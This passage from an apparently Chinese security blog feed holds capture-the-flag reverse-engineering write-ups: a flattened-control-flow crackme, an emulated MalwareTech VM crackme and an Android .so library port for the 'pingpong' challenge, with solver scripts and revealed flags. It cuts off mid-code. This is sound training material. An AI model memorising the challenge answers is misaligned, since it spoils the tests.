    <content type="html"><![CDATA[<h3 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h3><p><img src="/images/pasted-97.png" alt="upload successful"></p><blockquote><p>是控制流平坦化的题目</p></blockquote><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p><img src="/images/pasted-98.png" alt="upload successful"></p><blockquote><p>可以分析出函数的5个主要函数</p></blockquote><p><img src="/images/pasted-99.png" alt="upload successful"></p><blockquote><p>fun_check1(char *a1) 主要作用是检查输入字符串长度</p></blockquote><p><img src="/images/pasted-100.png" alt="upload successful"></p><blockquote><p>fun_check1(char *a1) 主要作用是检查输入前五个字节是否为flag{</p></blockquote><p><img src="/images/pasted-101.png" alt="upload successful"></p><blockquote><p>fun_check3(char *a1) 主要作用是检查输入的最后一个字节是否为}</p></blockquote><p><img src="/images/pasted-102.png" alt="upload successful"></p><blockquote><p>fun_check4(char *a1) 主要作用是检查输入的几个特殊部位的值是否为—</p></blockquote><p><img src="/images/pasted-103.png" alt="upload successful"></p><p><img src="/images/pasted-104.png" alt="upload successful"></p><p><img src="/images/pasted-105.png" alt="upload successful"></p><blockquote><p>输入的字符串进行加密后与字符串进行比较</p></blockquote><p><img src="/images/pasted-106.png" alt="upload successful"></p><blockquote><p>这就是比较的那个字符串 J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB</p></blockquote><blockquote><p>循环判断输入的每一位是否小于’0’或者大于’9’，如果满足条件，就判断是否等于’-‘，如果等于这个位置的字符就不变，如果大于’a’并且小于’z’，这个位置的字符串就减去48，其余的所有情况都进行将本位置的字符加上17</p></blockquote><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">"J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB"</span></span><br><span class="line"><span class="keyword">print</span> len(flag)</span><br><span class="line">strs = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">        temp = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> j &lt; ord(<span class="string">"0"</span>) <span class="keyword">or</span> j &gt; ord(<span class="string">"9"</span>):</span><br><span class="line">            <span class="keyword">if</span> j == ord(<span class="string">"-"</span>):</span><br><span class="line">                temp = chr(j)</span><br><span class="line">            <span class="keyword">elif</span> j &gt;= ord(<span class="string">'a'</span>) <span class="keyword">and</span> j &lt;= ord(<span class="string">"z"</span>):</span><br><span class="line">                temp = chr(j<span class="number">-48</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp = chr(j+<span class="number">17</span>)</span><br><span class="line">        <span class="keyword">if</span> temp == flag[i]:</span><br><span class="line">            strs += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> strs</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;flat&quot;&gt;&lt;a href=&quot;#flat&quot; class=&quot;headerlink&quot; title=&quot;flat&quot;&gt;&lt;/a&gt;flat&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-97.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="reverse" scheme="https://bufsnake.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://bufsnake.github.io/tags/reverse/"/>
    
      <category term="flat" scheme="https://bufsnake.github.io/tags/flat/"/>
    
      <category term="ollvm" scheme="https://bufsnake.github.io/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>记一次简单的VM程序逆向</title>
    <link href="https://bufsnake.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84VM%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91.html"/>
    <id>https://bufsnake.github.io/记一次简单的VM程序逆向.html</id>
    <published>2019-08-14T09:19:17.000Z</published>
    <updated>2019-08-14T09:31:07.412Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p><a href="http://malwaretech.com/downloads/vm1.zip" target="_blank" rel="noopener">vm crackme</a></p><p><img src="/images/pasted-91.png" alt="upload successful"></p><blockquote><p>程序给了三个文件，主要是要求我们通过分析vm1.exe文件的虚拟机，然后自己实现虚拟机，执行ram.bin中的opcode</p></blockquote><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/images/pasted-93.png" alt="upload successful"></p><blockquote><p>程序先申请一个堆，然后将unk_404040copy到Dst中，进而执行sub_4022e0_</p></blockquote><p><img src="/images/pasted-94.png" alt="upload successful"></p><blockquote><p>依次取出Dst中的数据，然后调用sub_402270，可知255之后的数据是opcode，255之前的数据是data</p></blockquote><p><img src="/images/pasted-95.png" alt="upload successful"></p><blockquote><p>这就是opcode执行的主要函数</p></blockquote><h3 id="实现自己的虚拟机"><a href="#实现自己的虚拟机" class="headerlink" title="实现自己的虚拟机"></a>实现自己的虚拟机</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">"./ram.bin"</span>,<span class="string">"rb"</span>)</span><br><span class="line">opcode = list(f.read())</span><br><span class="line"></span><br><span class="line">data = opcode[:<span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(data)):</span><br><span class="line">    data[i] = ord(opcode[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_402270</span><span class="params">(v0,v1,v2)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> byte</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">1</span>:</span><br><span class="line">        data[v1] = v2;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"mov data[%d], 0x%x"</span>%(v1,v2)</span><br><span class="line">    <span class="keyword">elif</span> v0 == <span class="number">2</span>:</span><br><span class="line">        byte = data[v1]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"mov rax, data[%d]"</span>%v1</span><br><span class="line">    <span class="keyword">elif</span> v0 == <span class="number">3</span>:</span><br><span class="line">        data[v1] = data[v1] ^ byte</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"xor data[%d], rax"</span>%v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(opcode)<span class="number">-257</span>,<span class="number">3</span>):</span><br><span class="line">    v0 = opcode[<span class="number">255</span>+i]</span><br><span class="line">    v1 = opcode[<span class="number">256</span>+i]</span><br><span class="line">    v2 = opcode[<span class="number">257</span>+i]</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sub_402270(ord(v0),ord(v1),ord(v2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> data)</span><br></pre></td></tr></table></figure><h3 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">mov data[29], 0xbd</span><br><span class="line">mov data[5], 0x53</span><br><span class="line">mov data[18], 0x48</span><br><span class="line">mov data[16], 0xe6</span><br><span class="line">mov data[19], 0x8a</span><br><span class="line">mov data[13], 0x47</span><br><span class="line">mov data[22], 0x13</span><br><span class="line">mov data[10], 0x15</span><br><span class="line">mov data[0], 0x98</span><br><span class="line">mov data[2], 0x3c</span><br><span class="line">mov data[24], 0xd9</span><br><span class="line">mov data[26], 0x57</span><br><span class="line">mov data[6], 0xab</span><br><span class="line">mov data[27], 0xc6</span><br><span class="line">mov data[1], 0x32</span><br><span class="line">mov data[23], 0x20</span><br><span class="line">mov data[21], 0x6f</span><br><span class="line">mov data[17], 0x2d</span><br><span class="line">mov data[8], 0xc9</span><br><span class="line">mov data[9], 0xe7</span><br><span class="line">mov data[3], 0x12</span><br><span class="line">mov data[12], 0x2f</span><br><span class="line">mov data[14], 0x88</span><br><span class="line">mov data[25], 0x6c</span><br><span class="line">mov data[4], 0x65</span><br><span class="line">mov data[30], 0xae</span><br><span class="line">mov data[20], 0x59</span><br><span class="line">mov data[31], 0x91</span><br><span class="line">mov data[28], 0x5d</span><br><span class="line">mov data[15], 0xae</span><br><span class="line">mov data[11], 0x15</span><br><span class="line">mov data[7], 0xcc</span><br><span class="line">mov rax, data[32]</span><br><span class="line">xor data[0], rax</span><br><span class="line">mov rax, data[33]</span><br><span class="line">xor data[1], rax</span><br><span class="line">mov rax, data[34]</span><br><span class="line">xor data[2], rax</span><br><span class="line">mov rax, data[35]</span><br><span class="line">xor data[3], rax</span><br><span class="line">mov rax, data[36]</span><br><span class="line">xor data[4], rax</span><br><span class="line">mov rax, data[37]</span><br><span class="line">xor data[5], rax</span><br><span class="line">mov rax, data[38]</span><br><span class="line">xor data[6], rax</span><br><span class="line">mov rax, data[39]</span><br><span class="line">xor data[7], rax</span><br><span class="line">mov rax, data[40]</span><br><span class="line">xor data[8], rax</span><br><span class="line">mov rax, data[41]</span><br><span class="line">xor data[9], rax</span><br><span class="line">mov rax, data[42]</span><br><span class="line">xor data[10], rax</span><br><span class="line">mov rax, data[43]</span><br><span class="line">xor data[11], rax</span><br><span class="line">mov rax, data[44]</span><br><span class="line">xor data[12], rax</span><br><span class="line">mov rax, data[45]</span><br><span class="line">xor data[13], rax</span><br><span class="line">mov rax, data[46]</span><br><span class="line">xor data[14], rax</span><br><span class="line">mov rax, data[47]</span><br><span class="line">xor data[15], rax</span><br><span class="line">mov rax, data[48]</span><br><span class="line">xor data[16], rax</span><br><span class="line">mov rax, data[49]</span><br><span class="line">xor data[17], rax</span><br><span class="line">mov rax, data[50]</span><br><span class="line">xor data[18], rax</span><br><span class="line">mov rax, data[51]</span><br><span class="line">xor data[19], rax</span><br><span class="line">mov rax, data[52]</span><br><span class="line">xor data[20], rax</span><br><span class="line">mov rax, data[53]</span><br><span class="line">xor data[21], rax</span><br><span class="line">mov rax, data[54]</span><br><span class="line">xor data[22], rax</span><br><span class="line">mov rax, data[55]</span><br><span class="line">xor data[23], rax</span><br><span class="line">mov rax, data[56]</span><br><span class="line">xor data[24], rax</span><br><span class="line">mov data[25], 0x0</span><br><span class="line">FLAG&#123;VMS-ARE-FOR-MALWARE&#125;W�]����~&#125;U��GP���`�.Ae�</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p> 第一次逆向vm程序，初次体验了被vm虐哭的感觉</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;题目来源&quot;&gt;&lt;a href=&quot;#题目来源&quot; class=&quot;headerlink&quot; title=&quot;题目来源&quot;&gt;&lt;/a&gt;题目来源&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://malwaretech.com/downloads/vm1.zip&quot; target=&quot;_bl
      
    
    </summary>
    
      <category term="reverse" scheme="https://bufsnake.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://bufsnake.github.io/tags/reverse/"/>
    
      <category term="vm" scheme="https://bufsnake.github.io/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>so库移植</title>
    <link href="https://bufsnake.github.io/so%E5%BA%93%E7%A7%BB%E6%A4%8D.html"/>
    <id>https://bufsnake.github.io/so库移植.html</id>
    <published>2019-08-14T02:14:12.000Z</published>
    <updated>2019-08-14T02:34:27.948Z</updated>
    
    <content type="html"><![CDATA[<h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><blockquote><p>攻防世界 pingpong</p></blockquote><h3 id="jadx"><a href="#jadx" class="headerlink" title="jadx"></a>jadx</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.geekerchina.pingpongmachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    OnClickListener jping = <span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.tt % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.p = <span class="number">0</span>;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.tt = MainActivity.<span class="keyword">this</span>.ttt;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.tt--;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.p = MainActivity.<span class="keyword">this</span>.ping(MainActivity.<span class="keyword">this</span>.p, MainActivity.<span class="keyword">this</span>.num);</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.num++;</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.num &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            TextView t = (TextView) MainActivity.<span class="keyword">this</span>.findViewById(R.id.out);</span><br><span class="line">            t.setText(<span class="string">"PING"</span>);</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.tt == <span class="number">0</span>) &#123;</span><br><span class="line">                t.setText(<span class="string">"FLAG: BCTF&#123;MagicNum"</span> + Integer.toString(MainActivity.<span class="keyword">this</span>.p) + <span class="string">"&#125;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    OnClickListener jpong = <span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.tt % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.p = <span class="number">0</span>;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.tt = MainActivity.<span class="keyword">this</span>.ttt;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.tt--;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.p = MainActivity.<span class="keyword">this</span>.pong(MainActivity.<span class="keyword">this</span>.p, MainActivity.<span class="keyword">this</span>.num);</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.num++;</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.num &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            TextView t = (TextView) MainActivity.<span class="keyword">this</span>.findViewById(R.id.out);</span><br><span class="line">            t.setText(<span class="string">"PONG"</span>);</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.tt == <span class="number">0</span>) &#123;</span><br><span class="line">                t.setText(<span class="string">"FLAG: BCTF&#123;MagicNum"</span> + Integer.toString(MainActivity.<span class="keyword">this</span>.p) + <span class="string">"&#125;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> tt = <span class="keyword">this</span>.ttt;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> ttt = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">ping</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> i2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">pong</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> i2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        ((Button) findViewById(R.id.button)).setOnClickListener(<span class="keyword">this</span>.jping);</span><br><span class="line">        ((Button) findViewById(R.id.button2)).setOnClickListener(<span class="keyword">this</span>.jpong);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.menu_main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"pp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这是主要逻辑<br>需要循环点击ping pong按钮，直到出现flag<br>ping pong函数属于native层的函数</p></blockquote><p><img src="/images/pasted-84.png" alt="upload successful"></p><p><img src="/images/pasted-85.png" alt="upload successful"></p><blockquote><p>so库的两个主要函数，都是经过了混淆，这里可以利用so库移植到别的程序上，通过程序来实现点击按钮的效果，而ping pong函数每次执行都会沉睡1s，1000000s的时间后就会得到flag了，所以我们需要修改so库的sleep函数</p></blockquote><p><img src="/images/pasted-86.png" alt="upload successful"></p><blockquote><p>另一个函数同理</p></blockquote><h3 id="编写app"><a href="#编写app" class="headerlink" title="编写app"></a>编写app</h3><ol><li>创建一个与源程序名称相同的app</li></ol><p><img src="/images/pasted-87.png" alt="upload successful"></p><ol start="2"><li>将程序中的so库移动到新建的app的libs目录下</li></ol><p><img src="/images/pasted-88.png" alt="upload successful"></p><ol start="3"><li>修改build.gradle<blockquote><p>添加一下代码</p></blockquote></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">task <span class="title">nativeLibsToJar</span><span class="params">(type: Zip, description: <span class="string">"create a jar archive of the native libs"</span>)</span> </span>&#123;</span><br><span class="line">    <span class="function">destinationDir <span class="title">file</span><span class="params">(<span class="string">"$projectDir/libs"</span>)</span></span></span><br><span class="line"><span class="function">    baseName "Native_Libs2"</span></span><br><span class="line"><span class="function">    extension "jar"</span></span><br><span class="line"><span class="function">    from <span class="title">fileTree</span><span class="params">(dir: <span class="string">"libs"</span>, include: <span class="string">"**/*.so"</span>)</span></span></span><br><span class="line"><span class="function">    into "lib"</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">tasks.<span class="title">withType</span><span class="params">(JavaCompile)</span> </span>&#123;</span><br><span class="line">    compileTask -&gt; compileTask.dependsOn(nativeLibsToJar)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>修改MainActivity代码</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.geekerchina.pingpongmachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"MainActivity"</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"pp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">ping</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> i2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">pong</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> i2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        <span class="keyword">int</span> ttt = <span class="number">1000000</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tt = ttt;</span><br><span class="line">        <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (tt % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                tt--;</span><br><span class="line">                p = pong(p, num);</span><br><span class="line">                num++;</span><br><span class="line">                <span class="keyword">if</span> (num &gt;= <span 